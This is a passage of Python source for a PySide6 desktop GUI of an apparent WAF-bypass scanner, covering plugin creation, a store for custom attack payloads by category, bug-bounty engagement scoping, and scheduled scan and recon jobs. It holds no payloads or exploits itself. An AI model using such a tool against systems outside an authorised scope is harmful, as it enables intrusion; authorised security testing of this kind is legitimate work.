                        class_base = re.sub(r'[^0-9a-zA-Z]+', ' ', base_name).title().replace(' ', '')
                        if not class_base:
                            class_base = 'CustomPlugin'
                        if class_base[0].isdigit():
                            class_base = f'Plugin{class_base}'
                        class_name = f"{class_base}Plugin"
                        template = template.replace('class MyCustomBypass(BypassPlugin):', f'class {class_name}(BypassPlugin):', 1)
                        template = template.replace('PLUGIN_CLASS = MyCustomBypass', f'PLUGIN_CLASS = {class_name}', 1)
                    try:
                        with open(new_path, 'w', encoding='utf-8') as f:
                            f.write(template + ('\n' if not template.endswith('\n') else ''))

                        # Show actual saved file name to the user and keep it in the field.
                        plugin_filename_edit.setText(os.path.basename(new_path))

                        # Reload plugins and refresh list immediately.
                        plugin_manager.load_all_plugins()
                        refresh_plugins()
                        QMessageBox.information(dlg, 'Plugin Saved', f'Plugin saved at:\\n{new_path}')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'Error', f'Failed to save plugin: {e}')
                
                create_btn.clicked.connect(create_from_template)
                create_layout.addWidget(create_btn)
                
                tabs.addTab(create_tab, _t('create_plugin', self._lang) if 'create_plugin' in TRANSLATIONS.get(self._lang, {}) else '🔧 Create')
                
                layout.addWidget(tabs, 1)
                
                # Close button -> back to Scan
                close_btn = QPushButton(_t('close', self._lang))
                close_btn.clicked.connect(lambda: self._navigate('scan'))
                layout.addWidget(close_btn)

                return dlg
            except Exception as e:
                import traceback
                QMessageBox.critical(self, 'Plugin Manager Error', f'{str(e)}\\n\\n{traceback.format_exc()}')
                return None

        # ==================== CUSTOM PAYLOADS ====================
        def _build_payloads_page(self):
            """Custom payloads management as an in-place page (rebuilt per visit)."""
            try:
                if not self._db:
                    QMessageBox.warning(self, 'Payloads', 'Database is not available.')
                    return

                dlg = QtWidgets.QWidget()
                dlg.setObjectName('PayloadsPage')
                dlg.setStyleSheet("""
                    QWidget#PayloadsPage { background-color: #0f1112; }
                    QLabel { color: #d7e1ea; }
                    QListWidget { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; }
                    QListWidget::item { padding: 8px; }
                    QListWidget::item:selected { background-color: #3b82f6; }
                    QLineEdit, QTextEdit, QComboBox { background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; padding: 5px; }
                """)
                
                layout = QVBoxLayout(dlg)
                
                header = QLabel('🎯 ' + (_t('custom_payloads', self._lang) if 'custom_payloads' in TRANSLATIONS.get(self._lang, {}) else 'Custom Payloads'))
                header.setFont(QFont('', 14, QFont.Bold))
                header.setStyleSheet('color: #58a6ff;')
                layout.addWidget(header)
                
                # Payloads list
                payload_list = QtWidgets.QListWidget()
                
                def refresh_payloads():
                    payload_list.clear()
                    payloads = self._db.get_custom_payloads()
                    for p in payloads:
                        item = QtWidgets.QListWidgetItem(f"[{p['category']}] {p['name']}")
                        item.setData(256, p)
                        payload_list.addItem(item)
                
                refresh_payloads()
                layout.addWidget(payload_list, 1)
                
                # Add payload form
                form_group = QtWidgets.QGroupBox(_t('add_payload', self._lang) if 'add_payload' in TRANSLATIONS.get(self._lang, {}) else 'Add New Payload')
                form_layout = QVBoxLayout(form_group)
                
                name_edit = QLineEdit()
                name_edit.setPlaceholderText(_t('payload_name', self._lang) if 'payload_name' in TRANSLATIONS.get(self._lang, {}) else 'Payload Name')
                
                cat_combo = QtWidgets.QComboBox()
                cat_combo.addItems(['SQL Injection', 'XSS', 'Command Injection', 'Path Traversal', 'SSRF', 'XXE', 'SSTI', 'Custom'])
                
                payload_edit = QTextEdit()
                payload_edit.setPlaceholderText(_t('payload_content', self._lang) if 'payload_content' in TRANSLATIONS.get(self._lang, {}) else 'Payload content...')
                payload_edit.setMaximumHeight(80)
                
                sev_combo = QtWidgets.QComboBox()
                sev_combo.addItems(['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'])
                sev_combo.setCurrentIndex(2)  # Default to MEDIUM
                
                form_layout.addWidget(name_edit)
                form_layout.addWidget(cat_combo)
                form_layout.addWidget(payload_edit)
                form_layout.addWidget(sev_combo)
                
                layout.addWidget(form_group)
                
                # Buttons
                btn_layout = QHBoxLayout()
                
                add_btn = QPushButton('➕ ' + (_t('add_payload', self._lang) if 'add_payload' in TRANSLATIONS.get(self._lang, {}) else 'Add'))
                import_btn = QPushButton('📥 ' + (_t('import_payloads', self._lang) if 'import_payloads' in TRANSLATIONS.get(self._lang, {}) else 'Import'))
                delete_btn = QPushButton('🗑 Delete Selected')
                
                def add_payload():
                    name = name_edit.text().strip()
                    payload = payload_edit.toPlainText().strip()
                    if not name or not payload:
                        QMessageBox.warning(dlg, 'Payload', 'Name and payload content are required.')
                        return
                    try:
                        self._db.add_custom_payload(
                            name=name,
                            category=cat_combo.currentText(),
                            payload=payload,
                            severity=sev_combo.currentText()
                        )
                        name_edit.clear()
                        payload_edit.clear()
                        refresh_payloads()
                        QMessageBox.information(dlg, 'Added', f'Payload "{name}" added!')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'Add Failed', str(e))
                
                def import_payloads():
                    path, _ = QFileDialog.getOpenFileName(dlg, 'Import Payloads', filter='JSON/Text (*.json *.txt)')
                    if not path:
                        return
                    try:
                        count = self._db.import_payloads_from_file(path)
                        refresh_payloads()
                        QMessageBox.information(dlg, 'Imported', f'Imported {count} payloads')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'Import Failed', str(e))

                def delete_payload():
                    item = payload_list.currentItem()
                    if item is None:
                        QMessageBox.warning(dlg, 'Delete Payload', 'Please select a payload to delete.')
                        return

                    payload_data = item.data(256) or {}
                    payload_id = payload_data.get('id') if isinstance(payload_data, dict) else None
                    payload_name = payload_data.get('name', 'selected payload') if isinstance(payload_data, dict) else 'selected payload'

                    if payload_id is None:
                        QMessageBox.warning(dlg, 'Delete Payload', 'Selected payload has no valid ID.')
                        return

                    confirm = QMessageBox.question(
                        dlg,
                        'Delete Payload',
                        f'Delete payload "{payload_name}"?',
                        QMessageBox.Yes | QMessageBox.No,
                        QMessageBox.No
                    )
                    if confirm != QMessageBox.Yes:
                        return

                    try:
                        deleted = self._db.delete_custom_payload(int(payload_id))
                        if deleted:
                            refresh_payloads()
                            QMessageBox.information(dlg, 'Deleted', f'Payload "{payload_name}" deleted.')
                        else:
                            QMessageBox.warning(dlg, 'Delete Payload', 'Payload was not found or already deleted.')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'Delete Failed', str(e))
                
                add_btn.clicked.connect(add_payload)
                import_btn.clicked.connect(import_payloads)
                delete_btn.clicked.connect(delete_payload)
                
                btn_layout.addWidget(add_btn)
                btn_layout.addWidget(import_btn)
                btn_layout.addWidget(delete_btn)
                layout.addLayout(btn_layout)
                
                close_btn = QPushButton(_t('close', self._lang))
                close_btn.clicked.connect(lambda: self._navigate('scan'))
                layout.addWidget(close_btn)

                return dlg
            except Exception as e:
                QMessageBox.critical(self, 'Payloads Error', str(e))
                return None

        def _build_engagements_page(self):
            """Bug bounty engagement workspace: scope, rules, and test notes."""
            try:
                dlg = QtWidgets.QWidget()
                dlg.setObjectName('EngagementsPage')
                layout = QVBoxLayout(dlg)
                layout.setContentsMargins(22, 20, 22, 20)
                layout.setSpacing(12)

                header = QLabel('Engagements')
                header.setFont(QFont('', 14, QFont.Bold))
                layout.addWidget(header)

                splitter = QtWidgets.QSplitter()
                splitter.setOrientation(QtCore.Qt.Orientation.Horizontal)
                layout.addWidget(splitter, 1)

                table = QtWidgets.QTableWidget()
                table.setColumnCount(4)
                table.setHorizontalHeaderLabels(['Name', 'Scope', 'Status', 'Updated'])
                table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
                table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
                try:
                    table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
                    table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
                except Exception:
                    pass
                splitter.addWidget(table)

                form = QtWidgets.QWidget()
                form_layout = QVBoxLayout(form)
                name_edit = QLineEdit()
                name_edit.setPlaceholderText('Program / workspace name')
                scope_edit = QTextEdit()
                scope_edit.setPlaceholderText('In-scope domains or URLs, one per line')
                scope_edit.setMaximumHeight(110)
                exclusions_edit = QTextEdit()
                exclusions_edit.setPlaceholderText('Excluded domains, URLs, paths, or notes, one per line')
                exclusions_edit.setMaximumHeight(90)
                rules_edit = QTextEdit()
                rules_edit.setPlaceholderText('Rules of engagement, rate limits, prohibited tests, testing windows')
                accounts_edit = QTextEdit()
                accounts_edit.setPlaceholderText('Test-account notes. Do not store real passwords here.')
                accounts_edit.setMaximumHeight(90)
                status_combo = QtWidgets.QComboBox()
                status_combo.addItems(['active', 'paused', 'archived'])
                for label, widget in (
                    ('Name', name_edit), ('Scope', scope_edit),
                    ('Exclusions', exclusions_edit), ('Rules', rules_edit),
                    ('Test Accounts', accounts_edit), ('Status', status_combo),
                ):
                    form_layout.addWidget(QLabel(label))
                    form_layout.addWidget(widget)
                btns = QHBoxLayout()
                new_btn = QPushButton('New')
                save_btn = QPushButton('Save')
                archive_btn = QPushButton('Archive')
                use_btn = QPushButton('Use For Scans')
                btns.addWidget(new_btn)
                btns.addWidget(save_btn)
                btns.addWidget(archive_btn)
                btns.addWidget(use_btn)
                form_layout.addLayout(btns)
                splitter.addWidget(form)

                selected_id = {'value': None}

                def _lines(text):
                    return [line.strip() for line in str(text or '').splitlines() if line.strip()]

                def refresh():
                    table.setRowCount(0)
                    if not self._db:
                        return
                    for row, engagement in enumerate(self._db.list_engagements(include_archived=True)):
                        table.insertRow(row)
                        table.setItem(row, 0, QtWidgets.QTableWidgetItem(engagement.get('name', '')))
                        table.setItem(row, 1, QtWidgets.QTableWidgetItem(', '.join(engagement.get('scope') or [])))
                        table.setItem(row, 2, QtWidgets.QTableWidgetItem(engagement.get('status', 'active')))
                        table.setItem(row, 3, QtWidgets.QTableWidgetItem(engagement.get('updated_at', '') or ''))
                        table.item(row, 0).setData(256, engagement)

                def clear_form():
                    selected_id['value'] = None
                    name_edit.clear()
                    scope_edit.clear()
                    exclusions_edit.clear()
                    rules_edit.clear()
                    accounts_edit.clear()
                    status_combo.setCurrentText('active')

                def load_selected():
                    items = table.selectedItems()
                    if not items:
                        return
                    engagement = table.item(items[0].row(), 0).data(256) or {}
                    selected_id['value'] = engagement.get('id')
                    name_edit.setText(engagement.get('name', ''))
                    scope_edit.setPlainText('\n'.join(engagement.get('scope') or []))
                    exclusions_edit.setPlainText('\n'.join(engagement.get('exclusions') or []))
                    rules_edit.setPlainText(engagement.get('rules_notes', '') or '')
                    accounts_edit.setPlainText(engagement.get('test_accounts_notes', '') or '')
                    status_combo.setCurrentText(engagement.get('status', 'active') or 'active')

                def save():
                    if not self._db:
                        return
                    name = name_edit.text().strip()
                    if not name:
                        QMessageBox.warning(dlg, 'Engagements', 'Name is required.')
                        return
                    eid = self._db.save_engagement(
                        name=name,
                        scope=_lines(scope_edit.toPlainText()),
                        exclusions=_lines(exclusions_edit.toPlainText()),
                        rules_notes=rules_edit.toPlainText().strip(),
                        test_accounts_notes=accounts_edit.toPlainText().strip(),
                        default_scan_profile=profile_from_prefs(_load_prefs()),
                        status=status_combo.currentText(),
                        engagement_id=selected_id['value'])
                    selected_id['value'] = eid
                    refresh()
                    self._refresh_engagement_combo()

                def archive():
                    if self._db and selected_id['value']:
                        self._db.delete_engagement(int(selected_id['value']))
                        clear_form()
                        refresh()
                        self._refresh_engagement_combo()

                def use_for_scans():
                    if not selected_id['value']:
                        load_selected()
                    if selected_id['value']:
                        try:
                            prefs = _load_prefs()
                            prefs['current_engagement_id'] = selected_id['value']
                            _save_prefs(prefs)
                            self._prefs = prefs
                            self._refresh_engagement_combo()
                            self._navigate('scan')
                        except Exception:
                            pass

                table.itemSelectionChanged.connect(load_selected)
                new_btn.clicked.connect(clear_form)
                save_btn.clicked.connect(save)
                archive_btn.clicked.connect(archive)
                use_btn.clicked.connect(use_for_scans)
                refresh()
                return dlg
            except Exception as e:
                QMessageBox.critical(self, 'Engagements Error', str(e))
                return None

        def _build_schedule_page(self):
            """Scheduled jobs (scan or recon) as an in-place page (rebuilt per visit)."""
            try:
                if not self._db:
                    QMessageBox.warning(self, 'Scheduled Scans', 'Database is not available.')
                    return

                from PySide6.QtWidgets import QTimeEdit, QDateTimeEdit, QGridLayout
                from PySide6.QtCore import QDateTime, QTime
                from PySide6.QtGui import QFontDatabase
                
                # Find a font that supports Unicode (Arabic, Cyrillic, etc.)
                try:
                    families = set(QFontDatabase.families())
                except Exception:
                    try:
                        families = set(QFontDatabase().families())
                    except Exception:
                        families = set()
                
                unicode_fonts = ["Segoe UI", "Arial", "Noto Sans", "Tahoma", "Microsoft Sans Serif", "DejaVu Sans"]
                selected_font = next((f for f in unicode_fonts if f in families), "")
                
                dlg = QtWidgets.QWidget()
                dlg.setObjectName('SchedulePage')
                dlg.setStyleSheet(f"""
                    QWidget#SchedulePage {{ background-color: #0f1112; font-family: '{selected_font}'; }}
                    QLabel {{ color: #d7e1ea; font-family: '{selected_font}'; }}
                    QTableWidget {{ background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; gridline-color: #2b2f33; font-family: '{selected_font}'; }}
                    QTableWidget::item {{ padding: 8px; }}
                    QTableWidget::item:selected {{ background-color: #3b82f6; }}
                    QHeaderView::section {{ background-color: #21262d; color: #d7e1ea; padding: 8px; border: 1px solid #2b2f33; font-family: '{selected_font}'; }}
                    QLineEdit, QComboBox, QDateTimeEdit {{ background-color: #16181a; color: #d7e1ea; border: 1px solid #2b2f33; padding: 5px; font-family: '{selected_font}'; }}
                    QGroupBox {{ color: #d7e1ea; border: 1px solid #2b2f33; margin-top: 10px; padding-top: 10px; font-family: '{selected_font}'; }}
                    QGroupBox::title {{ subcontrol-origin: margin; left: 10px; padding: 0 5px; }}
                    QPushButton {{ font-family: '{selected_font}'; }}
                """)
                
                layout = QVBoxLayout(dlg)
                
                header = QLabel('⏰ ' + (_t('scheduled_scans', self._lang) if 'scheduled_scans' in TRANSLATIONS.get(self._lang, {}) else 'Scheduled Scans'))
                header.setFont(QFont('', 14, QFont.Bold))
                header.setStyleSheet('color: #58a6ff;')
                layout.addWidget(header)
                
                # Scheduled scans table
                table = QtWidgets.QTableWidget()
                table.setColumnCount(6)
                table.setHorizontalHeaderLabels(['Target', 'Type', 'Schedule', 'Next Run', 'Status', 'Actions'])
                table.horizontalHeader().setStretchLastSection(True)
                table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
                
                def refresh_table():
                    table.setRowCount(0)
                    if self._db:
                        schedules = self._db.get_scheduled_scans()
                        for i, sched in enumerate(schedules):
                            table.insertRow(i)
                            table.setItem(i, 0, QtWidgets.QTableWidgetItem(sched.get('target', 'N/A')))
                            table.setItem(i, 1, QtWidgets.QTableWidgetItem((sched.get('job_type') or 'scan').title()))
                            table.setItem(i, 2, QtWidgets.QTableWidgetItem(sched.get('schedule_type', 'once')))
                            table.setItem(i, 3, QtWidgets.QTableWidgetItem(sched.get('next_run', 'N/A')))
                            status_txt = '🟢 Active' if sched.get('enabled', True) else '⚪ Disabled'
                            table.setItem(i, 4, QtWidgets.QTableWidgetItem(status_txt))

                            # Action button
                            del_btn = QPushButton('🗑️')
                            del_btn.setFixedWidth(35)
                            sched_id = sched.get('id')
                            del_btn.clicked.connect(lambda checked, sid=sched_id: delete_schedule(sid))
                            table.setCellWidget(i, 5, del_btn)
                
                def delete_schedule(sched_id):
                    if self._db:
                        self._db.delete_scheduled_scan(sched_id)
                        refresh_table()
                
                refresh_table()
                layout.addWidget(table, 1)
                
                # New schedule form
                form_group = QtWidgets.QGroupBox(_t('schedule_scan', self._lang) if 'schedule_scan' in TRANSLATIONS.get(self._lang, {}) else 'Schedule New Scan')
                form_layout = QGridLayout(form_group)
                
                form_layout.addWidget(QLabel('Target:'), 0, 0)
                target_edit = QLineEdit()
                target_edit.setPlaceholderText('https://example.com')
                # Pre-fill with current targets if available
                if self.tree.topLevelItemCount() > 0:
                    first_item = self.tree.topLevelItem(0)
                    target_edit.setText(first_item.data(0, 256) or first_item.text(0))
                form_layout.addWidget(target_edit, 0, 1)
                
                form_layout.addWidget(QLabel('Schedule:'), 1, 0)
                schedule_combo = QtWidgets.QComboBox()
                schedule_combo.addItems([
                    _t('schedule_once', self._lang) if 'schedule_once' in TRANSLATIONS.get(self._lang, {}) else 'Once',
                    _t('schedule_daily', self._lang) if 'schedule_daily' in TRANSLATIONS.get(self._lang, {}) else 'Daily',
                    _t('schedule_weekly', self._lang) if 'schedule_weekly' in TRANSLATIONS.get(self._lang, {}) else 'Weekly',
                    _t('schedule_monthly', self._lang) if 'schedule_monthly' in TRANSLATIONS.get(self._lang, {}) else 'Monthly'
                ])
                form_layout.addWidget(schedule_combo, 1, 1)
                
                form_layout.addWidget(QLabel('Date/Time:'), 2, 0)
                datetime_edit = QDateTimeEdit()
                datetime_edit.setDateTime(QDateTime.currentDateTime().addSecs(3600))  # Default to 1 hour from now
                datetime_edit.setCalendarPopup(True)
                form_layout.addWidget(datetime_edit, 2, 1)

                form_layout.addWidget(QLabel('Type:'), 3, 0)
                jobtype_combo = QtWidgets.QComboBox()
                jobtype_combo.addItems(['Scan', 'Recon'])
                jobtype_combo.setToolTip('Scan = WAF bypass scan. Recon = subfinder/amass/dnsx/httpx/nmap.')
                form_layout.addWidget(jobtype_combo, 3, 1)

                layout.addWidget(form_group)
                
                # Buttons
                btn_layout = QHBoxLayout()
                
                add_btn = QPushButton('➕ ' + (_t('schedule_scan', self._lang) if 'schedule_scan' in TRANSLATIONS.get(self._lang, {}) else 'Add Schedule'))
                add_btn.setStyleSheet('QPushButton { background-color: #238636; color: white; padding: 8px 16px; } QPushButton:hover { background-color: #2ea043; }')
                
                def add_schedule():
                    target = target_edit.text().strip()
                    if not target:
                        QMessageBox.warning(dlg, 'Error', 'Please enter a target URL')
                        return
                    
                    schedule_types = ['once', 'daily', 'weekly', 'monthly']
                    schedule_type = schedule_types[schedule_combo.currentIndex()]
                    # Use robust conversion across PySide versions
                    dt_val = datetime_edit.dateTime()
                    scheduled_time = dt_val.toPython() if hasattr(dt_val, 'toPython') else dt_val.toPyDateTime()

                    try:
                        self._db.add_scheduled_scan(
                            target=target,
                            schedule_type=schedule_type,
                            scheduled_time=scheduled_time.isoformat(),
                            job_type=jobtype_combo.currentText().lower(),
                            settings={'threads': int(self.threads_spin.value()), 'delay': float(self.delay_spin.value())}
                        )
                        target_edit.clear()
                        refresh_table()
                        time_str = scheduled_time.strftime('%Y-%m-%d %H:%M')
                        QMessageBox.information(dlg, 'Scheduled', _t('scan_scheduled', self._lang).format(time=time_str) if 'scan_scheduled' in TRANSLATIONS.get(self._lang, {}) else f'Scan scheduled for {time_str}')
                    except Exception as e:
                        QMessageBox.critical(dlg, 'Schedule Failed', str(e))
                
                add_btn.clicked.connect(add_schedule)
                btn_layout.addWidget(add_btn)
                btn_layout.addStretch()
                
                close_btn = QPushButton(_t('close', self._lang))
                close_btn.clicked.connect(lambda: self._navigate('scan'))
                btn_layout.addWidget(close_btn)

                layout.addLayout(btn_layout)

                # Info label
                info_label = QLabel('ℹ️ Scheduled jobs (Scan or Recon) run automatically while the app is open.')
                info_label.setStyleSheet('color: #8b949e; font-size: 11px;')
                layout.addWidget(info_label)

                return dlg
            except Exception as e:
                QMessageBox.critical(self, 'Scheduled Scans Error', str(e))
                return None

        # ------------------------------------------------------------------ #
        # Scheduler executor — fires due scheduled jobs (scan or recon)
        # ------------------------------------------------------------------ #
        def _scan_running(self):
            wt = getattr(self, '_worker_thread', None)
            try:
                return wt is not None and wt.isRunning()
            except Exception:
                return wt is not None

        def _advance_schedule(self, iso, sched_type):
            """Next fire time for a recurring job, strictly in the future."""
            from datetime import datetime, timedelta
            try:
                nxt = datetime.fromisoformat(str(iso))
            except Exception:
                nxt = datetime.now()
            step = {'daily': timedelta(days=1), 'weekly': timedelta(weeks=1),
                    'monthly': timedelta(days=30)}.get(sched_type, timedelta(days=1))
            now = datetime.now()
            # Guard against runaway loops on absurd data.
            for _ in range(10000):
                if nxt > now:
                    break
                nxt = nxt + step
            return nxt.isoformat()

        def _check_due_schedules(self):
            """Timer tick: run any enabled scheduled job whose time has arrived."""
            if not getattr(self, '_db', None):
                return
            from datetime import datetime
            try:
                schedules = self._db.get_scheduled_scans()
            except Exception:
                return
            now = datetime.now()
            for s in schedules:
                if not s.get('enabled', True):
                    continue
                nr = s.get('next_run') or s.get('schedule_time')
                if not nr:
                    continue
                try:
                    due = datetime.fromisoformat(str(nr))
                except Exception:
                    continue
                if due > now:
                    continue
                try:
                    self._fire_scheduled_job(s)
                except Exception as e:
                    try:
                        self.append_log(f"[scheduler] job error: {e}\n")
                    except Exception:
                        pass

        def _fire_scheduled_job(self, s):
            job_type = (s.get('job_type') or 'scan').lower()
            targets = s.get('targets') or []
            target = targets[0] if targets else (
                s.get('target') if s.get('target') not in (None, 'N/A') else None)
            if not target:
                try:
                    self._db.mark_scheduled_run(s['id'], disable=True)
                except Exception:
                    pass
                return
            # Scan jobs need the scan worker free; a recon job runs independently,
            # so it can fire even while a scan is in progress.
            if job_type != 'recon' and self._scan_running():
                return  # leave it due; retry on the next tick

            sched_type = (s.get('schedule_type') or 'once').lower()
            if sched_type == 'once':
                self._db.mark_scheduled_run(s['id'], disable=True)
            else:
                self._db.mark_scheduled_run(
                    s['id'],
                    next_run=self._advance_schedule(
                        s.get('next_run') or s.get('schedule_time'), sched_type))

            if job_type == 'recon':
                self._run_scheduled_recon(target)
            else:
                self._run_scheduled_scan(target)

        def _run_scheduled_scan(self, target):
            try:
                self.append_log(f"[scheduler] starting scan for {target}\n")
                self.target_edit.setText(target)
                self.add_target()
                self.start_scan()
            except Exception as e:
                self.append_log(f"[scheduler] scan launch failed: {e}\n")

        def _run_scheduled_recon(self, target):
            """Run a recon job headlessly and merge its findings into Results."""
            from PySide6.QtCore import QProcess, QProcessEnvironment
            import tempfile
            try:
                from .recon import preflight
                if preflight():
                    self.append_log("[scheduler] recon skipped — required tools not installed\n")
                    return
            except Exception:
                pass
            tmpf = tempfile.NamedTemporaryFile(delete=False, suffix='.json')
            tmpf.close()
            cmd = self._recon_worker_cmd(target, tmpf.name, 300, 100, False)
            proc = QProcess(self)
            proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
            env = QProcessEnvironment.systemEnvironment()
            env.insert('PYTHONUNBUFFERED', '1')
            proc.setProcessEnvironment(env)
            proc.readyReadStandardOutput.connect(
                lambda: self.append_log(bytes(proc.readAllStandardOutput()).decode('utf-8', 'replace')))

            def _done(code=0, status=None):
                try:
                    if os.path.exists(tmpf.name):
                        with open(tmpf.name, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        if isinstance(data, list):
                            self._results.extend(data)
                            try:
                                self._live_refresh()
                            except Exception:
                                pass
                            self.append_log(
                                f"[scheduler] recon finished: {len(data)} finding(s) for {target}\n")
                        os.unlink(tmpf.name)
                except Exception as e:
                    self.append_log(f"[scheduler] recon parse failed: {e}\n")
            proc.finished.connect(_done)
            self._sched_procs = getattr(self, '_sched_procs', [])
            self._sched_procs.append(proc)
            self.append_log(f"[scheduler] starting recon for {target}\n")
            proc.start(cmd[0], cmd[1:])

        def closeEvent(self, event):
            # Save persistent results to database
            try:
                if self._db and self._results:
                    for target, data in self._per_target_results.items():
                        results = data.get('done', [])
                        status = 'done' if results else 'queued'
                        self._db.save_persistent_target(
                            target=target,
                            status=status,
                            scan_id=self._current_scan_id,
                            findings_count=len(results),
                            results=results,
                            engagement_id=getattr(self, '_current_engagement_id', None)
                        )
            except Exception:
                pass
            
            # Save scan queue state for restoration on next launch
            try:
                if self._db:
                    queue_targets = []
                    for i in range(self.tree.topLevelItemCount()):
                        item = self.tree.topLevelItem(i)
                        # Use actual URL from UserRole, not censored display text
                        target = item.data(0, 256) or item.text(0)
                        status = item.text(1) if item.text(1) else 'queued'
                        settings = {
                            'threads': int(self.threads_spin.value()),
                            'delay': float(self.delay_spin.value()),
                            'concurrent': int(self.concurrent_spin.value()),
                        }
                        queue_targets.append({
                            'target': target,
                            'status': status,
                            'settings': settings
                        })
                    if queue_targets:
                        self._db.save_scan_queue(queue_targets)
            except Exception:
                pass
            
            try:
                prefs = _load_prefs()
                prefs['qt_geometry'] = f"{self.width()}x{self.height()}"
                prefs['threads'] = int(self.threads_spin.value())
                prefs['delay'] = float(self.delay_spin.value())
                prefs['concurrent'] = int(self.concurrent_spin.value())
                prefs['use_concurrent'] = bool(self.use_concurrent_chk.isChecked())
                if bool(prefs.get('remember_targets', True)):
                    # Use actual URLs from UserRole, not censored display text
                    targets_to_save = []
                    for i in range(self.tree.topLevelItemCount()):
                        item = self.tree.topLevelItem(i)
                        actual_url = item.data(0, 256) or item.text(0)
                        if actual_url:
                            targets_to_save.append(actual_url)
                    prefs['last_targets'] = targets_to_save
                else:
                    prefs['last_targets'] = []
                _save_prefs(prefs)
            except Exception:
                pass
            try:
                super().closeEvent(event)
            except Exception:
                pass

    def run_qt():
        # Must be set before the QApplication is created so the embedded
        # QtWebEngine browser (P5) can share GL contexts. Harmless no-op when
        # WebEngine is unused / unavailable.
        try:
            QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_ShareOpenGLContexts)
        except Exception:
            pass
        app = QApplication([])

        # Always apply dark mode - Fusion style with dark palette
        try:
            from PySide6.QtGui import QPalette, QColor
            app.setStyle('Fusion')
            dark_palette = QPalette()
            dark_palette.setColor(QPalette.Window, QColor(22, 24, 26))
            dark_palette.setColor(QPalette.WindowText, QColor(215, 225, 234))
            dark_palette.setColor(QPalette.Base, QColor(15, 17, 18))
            dark_palette.setColor(QPalette.AlternateBase, QColor(22, 24, 26))
            dark_palette.setColor(QPalette.ToolTipBase, QColor(215, 225, 234))
            dark_palette.setColor(QPalette.ToolTipText, QColor(215, 225, 234))
            dark_palette.setColor(QPalette.Text, QColor(215, 225, 234))
            dark_palette.setColor(QPalette.Button, QColor(43, 47, 51))
            dark_palette.setColor(QPalette.ButtonText, QColor(215, 225, 234))
            dark_palette.setColor(QPalette.BrightText, QColor(255, 77, 77))
            dark_palette.setColor(QPalette.Link, QColor(88, 166, 255))
            dark_palette.setColor(QPalette.Highlight, QColor(99, 102, 241))
            dark_palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
            app.setPalette(dark_palette)
        except Exception:
            pass

        # Apply the centralized modern neutral-dark theme (global QSS).
        try:
            try:
                from .theme import apply_theme
            except ImportError:
                try:
                    from wafpierce.theme import apply_theme
                except ImportError:
                    from theme import apply_theme
            apply_theme(app)
        except Exception as _e:
            print(f"[!] Theme load failed: {_e}")

        # set application icon from bundled logo when available
        try:
            if os.path.exists(LOGO_PATH):
                from PySide6.QtGui import QIcon
                icon = QIcon(LOGO_PATH)
                app.setWindowIcon(icon)
        except Exception:
            pass
        
        # Show legal disclaimer first
        if not _show_disclaimer_qt(app):
            print("User declined the legal disclaimer. Exiting.")
            return 0
        
        w = PierceQtApp()
        w.show()
        # run the Qt event loop and capture exit code so we can cleanup the tmp watermark
        rc = app.exec()
        try:
            tmp = getattr(w, '_qt_watermark_tmp', None)
            if tmp and os.path.exists(tmp):
                try:
                    os.remove(tmp)
                except Exception:
                    pass
        except Exception:
            pass
        return rc

    # run Qt GUI
    return_code = run_qt()
    sys.exit(return_code)


if __name__ == '__main__':
    main()

#    \|/          (__)    <-- GUI made by Marwan-verse
#         `\------(oo)
#           ||    (__)
#           ||w--||     \|/
#       \|/
# there are 5 easter eggs hidden in this codebase
# can you find them all ?
